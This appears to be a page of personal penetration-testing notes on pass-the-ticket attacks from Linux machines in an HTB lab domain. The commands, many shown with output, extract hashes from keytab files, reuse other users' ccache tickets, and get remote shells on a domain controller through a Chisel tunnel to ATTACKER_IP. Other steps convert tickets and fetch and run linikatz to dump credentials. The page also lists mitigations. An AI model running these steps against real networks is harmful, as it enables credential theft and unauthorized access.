+
+  .                                   D        0  Thu Oct  6 14:46:26 2022
+  ..                                  D        0  Thu Oct  6 14:46:26 2022
+  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022
+</code></pre>
+<p><strong>Tip:</strong> Save your current ccache file before importing a keytab:</p>
+<pre><code class="language-bash">cp $KRB5CCNAME /tmp/krb5cc_backup
+</code></pre>
+<hr>
+<h3 id="extracting-hashes-from-keytab-files"><a class="header" href="#extracting-hashes-from-keytab-files">Extracting Hashes from Keytab Files</a></h3>
+<p>Use KeyTabExtract to extract hashes for offline cracking:</p>
+<pre><code class="language-bash">david@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+        REALM : INLANEFREIGHT.HTB
+        SERVICE PRINCIPAL : carlos/
+        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
+        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
+        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
+</code></pre>
+<p>With these hashes you can:</p>
+<ul>
+<li>Perform Pass the Hash with the NTLM hash</li>
+<li>Forge tickets using AES256/AES128 with Rubeus</li>
+<li>Attempt to crack the hashes offline</li>
+</ul>
+<p><strong>Note:</strong> A keytab file can contain multiple credentials from different users.</p>
+<hr>
+<h3 id="finding-ccache-files"><a class="header" href="#finding-ccache-files">Finding ccache Files</a></h3>
+<p>ccache files are stored in <code>/tmp</code> by default:</p>
+<pre><code class="language-bash">david@linux01:~$ ls -la /tmp/krb5cc_*
+
+-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
+-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
+-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 3175 Oct 10 19:55 /tmp/krb5cc_647402606
+</code></pre>
+<p>Check the environment variable for custom locations:</p>
+<pre><code class="language-bash">david@linux01:~$ echo $KRB5CCNAME
+</code></pre>
+<h3 id="using-ccache-files"><a class="header" href="#using-ccache-files">Using ccache Files</a></h3>
+<p>Set the <code>KRB5CCNAME</code> variable to use a specific ccache file:</p>
+<pre><code class="language-bash"># As root, use another user's ccache
+root@linux01:~# export KRB5CCNAME=/tmp/krb5cc_647401106_I8I133
+
+root@linux01:~# klist
+
+Ticket cache: FILE:/tmp/krb5cc_647401106_I8I133
+Default principal: julio@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+
+# Access resources
+root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
+
+  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
+  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
+  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
+  Users                              DR        0  Thu Oct  6 11:46:05 2022
+  Windows                             D        0  Wed Oct  5 13:20:00 2022
+</code></pre>
+<p><strong>Note:</strong> ccache files are temporary and may expire or change during login/logout operations. Check “Valid starting” and “Expires” times with <code>klist</code>.</p>
+<hr>
+<h3 id="using-linux-attack-tools-with-kerberos"><a class="header" href="#using-linux-attack-tools-with-kerberos">Using Linux Attack Tools with Kerberos</a></h3>
+<p>Many Linux tools support Kerberos authentication. Set <code>KRB5CCNAME</code> to point to your ccache file.</p>
+<h4 id="prerequisites-for-non-domain-joined-attack-hosts"><a class="header" href="#prerequisites-for-non-domain-joined-attack-hosts">Prerequisites for Non-Domain-Joined Attack Hosts</a></h4>
+<ol>
+<li>Configure <code>/etc/hosts</code> to resolve domain names:</li>
+</ol>
+<pre><code class="language-bash">$ cat /etc/hosts
+
+172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
+172.16.1.5  ms01.inlanefreight.htb  ms01
+</code></pre>
+<ol start="2">
+<li>Set up a SOCKS proxy (e.g., with Chisel) if needed:</li>
+</ol>
+<pre><code class="language-bash"># On attack host
+$ sudo ./chisel server --reverse
+
+# On pivot host (MS01)
+C:\&gt; chisel.exe client ATTACKER_IP:8080 R:socks
+</code></pre>
+<ol start="3">
+<li>Configure proxychains:</li>
+</ol>
+<pre><code class="language-bash">$ cat /etc/proxychains.conf
+[ProxyList]
+socks5 127.0.0.1 1080
+</code></pre>
+<h4 id="using-impacket-with-kerberos"><a class="header" href="#using-impacket-with-kerberos">Using Impacket with Kerberos</a></h4>
+<pre><code class="language-bash"># Set the ccache file
+$ export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+
+# Use impacket tools with -k flag
+$ proxychains impacket-wmiexec dc01 -k
+
+[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01:445 ... OK
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;whoami
+inlanefreight\julio
+</code></pre>
+<h4 id="using-evil-winrm-with-kerberos"><a class="header" href="#using-evil-winrm-with-kerberos">Using Evil-WinRM with Kerberos</a></h4>
+<pre><code class="language-bash">$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
+
+[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01:5985 ... OK
+*Evil-WinRM* PS C:\Users\julio\Documents&gt; whoami ; hostname
+inlanefreight\julio
+DC01
+</code></pre>
+<hr>
+<h3 id="converting-tickets-between-formats"><a class="header" href="#converting-tickets-between-formats">Converting Tickets Between Formats</a></h3>
+<p>Use <code>impacket-ticketConverter</code> to convert between ccache (Linux) and kirbi (Windows) formats:</p>
+<h4 id="ccache-to-kirbi"><a class="header" href="#ccache-to-kirbi">ccache to kirbi</a></h4>
+<pre><code class="language-bash">$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] converting ccache to kirbi...
+[+] done
+</code></pre>
+<h4 id="import-kirbi-in-windows"><a class="header" href="#import-kirbi-in-windows">Import kirbi in Windows</a></h4>
+<pre><code class="language-cmd">C:\tools&gt; Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+C:\tools&gt; klist
+
+Cached Tickets: (1)
+
+#0&gt;     Client: julio @ INLANEFREIGHT.HTB
+        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Start Time: 10/10/2022 5:46:02 (local)
+        End Time:   10/10/2022 15:46:02 (local)
+
+C:\tools&gt; dir \\dc01\julio
+ Directory of \\dc01\julio
+
+07/14/2022  04:18 PM                17 julio.txt
+</code></pre>
+<hr>
+<h3 id="linikatz"><a class="header" href="#linikatz">Linikatz</a></h3>
+<p>Linikatz is a tool for extracting credentials from Linux machines integrated with Active Directory (similar to Mimikatz for Windows).</p>
+<p><strong>Requirements:</strong> Must run as root.</p>
+<p><strong>Supported integrations:</strong> FreeIPA, SSSD, Samba, Vintella, and more.</p>
+<pre><code class="language-bash">$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+$ chmod +x linikatz.sh
+$ sudo ./linikatz.sh
+
+ _ _       _ _         _
+| (_)_ __ (_) | ____ _| |_ ____
+| | | '_ \| | |/ / _` | __|_  /
+| | | | | | |   &lt; (_| | |_ / /
+|_|_|_| |_|_|_|\_\__,_|\__/___|
+
+             =[ @timb_machine ]=
+
+I: [sss-check] SSS AD configuration
+I: [kerberos-check] Kerberos configuration
+-rw-r--r-- 1 root root 2800 Oct  7 12:17 /etc/krb5.conf
+-rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
+I: [kerberos-check] User Kerberos tickets
+Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
+Default principal: julio@INLANEFREIGHT.HTB
+...
+</code></pre>
+<p>Linikatz extracts credentials and places them in a folder named <code>linikatz.*</code> containing ccache and keytab files.</p>
+<hr>
+<h3 id="linux-ptt-command-summary"><a class="header" href="#linux-ptt-command-summary">Linux PtT Command Summary</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>realm list</code></td><td>Check if machine is domain-joined</td></tr>
+<tr><td><code>find / -name *keytab* -ls 2&gt;/dev/null</code></td><td>Find keytab files</td></tr>
+<tr><td><code>klist -k -t &lt;keytab&gt;</code></td><td>List principals in keytab</td></tr>
+<tr><td><code>kinit &lt;user&gt; -k -t &lt;keytab&gt;</code></td><td>Import keytab and get TGT</td></tr>
+<tr><td><code>klist</code></td><td>List current Kerberos tickets</td></tr>
+<tr><td><code>export KRB5CCNAME=&lt;ccache&gt;</code></td><td>Set ccache file to use</td></tr>
+<tr><td><code>smbclient //&lt;host&gt;/&lt;share&gt; -k</code></td><td>Access SMB with Kerberos</td></tr>
+<tr><td><code>impacket-ticketConverter &lt;in&gt; &lt;out&gt;</code></td><td>Convert ccache/kirbi formats</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="mitigations"><a class="header" href="#mitigations">Mitigations</a></h2>
+<ul>
+<li>Enable Credential Guard to protect LSASS</li>
+<li>Use Protected Users security group for sensitive accounts</li>
+<li>Implement Privileged Access Workstations (PAWs)</li>
+<li>Monitor for suspicious Kerberos activity (Event IDs 4768, 4769)</li>
+<li>Regularly rotate service account passwords</li>
+<li>Limit the lifetime of Kerberos tickets via Group Policy</li>
+<li>Restrict permissions on keytab and ccache files on Linux systems</li>
+<li>Use short-lived tickets and enforce ticket renewal</li>
+</ul>
+<hr>
+<h2 id="references"><a class="header" href="#references">References</a></h2>
+<ul>
+<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz Documentation</a></li>
+<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
+<li><a href="https://www.slideshare.net/gentaboron/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it">Abusing Microsoft Kerberos - Benjamin Delpy &amp; Skip Duckwall</a></li>
+<li><a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a></li>
+<li><a href="https://github.com/CiscoCXSecurity/linikatz">Linikatz</a></li>
+<li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li>
+</ul>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../infosec/windows/pass-the-hash.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
+                            </a>
+
+                            <a rel="next prefetch" href="../../electronics/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../infosec/windows/pass-the-hash.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
+                    </a>
+
+                    <a rel="next prefetch" href="../../electronics/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
+                    </a>
+            </nav>
+
+        </div>
+
+        <template id=fa-eye><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></template>
+        <template id=fa-eye-slash><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c5.2-11.8 8-24.8 8-38.5c0-53-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zm223.1 298L373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5z"/></svg></span></template>
+        <template id=fa-copy><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M502.6 70.63l-61.25-61.25C435.4 3.371 427.2 0 418.7 0H255.1c-35.35 0-64 28.66-64 64l.0195 256C192 355.4 220.7 384 256 384h192c35.2 0 64-28.8 64-64V93.25C512 84.77 508.6 76.63 502.6 70.63zM464 320c0 8.836-7.164 16-16 16H255.1c-8.838 0-16-7.164-16-16L239.1 64.13c0-8.836 7.164-16 16-16h128L384 96c0 17.67 14.33 32 32 32h47.1V320zM272 448c0 8.836-7.164 16-16 16H63.1c-8.838 0-16-7.164-16-16L47.98 192.1c0-8.836 7.164-16 16-16H160V128H63.99c-35.35 0-64 28.65-64 64l.0098 256C.002 483.3 28.66 512 64 512h192c35.2 0 64-28.8 64-64v-32h-47.1L272 448z"/></svg></span></template>
+        <template id=fa-play><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M73 39c-14.8-9.1-33.4-9.4-48.5-.9S0 62.6 0 80V432c0 17.4 9.4 33.4 24.5 41.9s33.7 8.1 48.5-.9L361 297c14.3-8.7 23-24.2 23-41s-8.7-32.2-23-41L73 39z"/></svg></span></template>
+        <template id=fa-clock-rotate-left><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M75 75L41 41C25.9 25.9 0 36.6 0 57.9V168c0 13.3 10.7 24 24 24H134.1c21.4 0 32.1-25.9 17-41l-30.8-30.8C155 85.5 203 64 256 64c106 0 192 86 192 192s-86 192-192 192c-40.8 0-78.6-12.7-109.7-34.4c-14.5-10.1-34.4-6.6-44.6 7.9s-6.6 34.4 7.9 44.6C151.2 495 201.7 512 256 512c141.4 0 256-114.6 256-256S397.4 0 256 0C185.3 0 121.3 28.7 75 75zm181 53c-13.3 0-24 10.7-24 24V256c0 6.4 2.5 12.5 7 17l72 72c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-65-65V152c0-13.3-10.7-24-24-24z"/></svg></span></template>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr-ef4e11c1.min.js"></script>
+        <script src="../../mark-09e88c2c.min.js"></script>
+        <script src="../../searcher-c2a407aa.js"></script>
+
+        <script src="../../clipboard-1626706a.min.js"></script>
+        <script src="../../highlight-abc7f01d.js"></script>
+        <script src="../../book-a0b12cfe.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+
+    </div>
+    </body>
+</html>
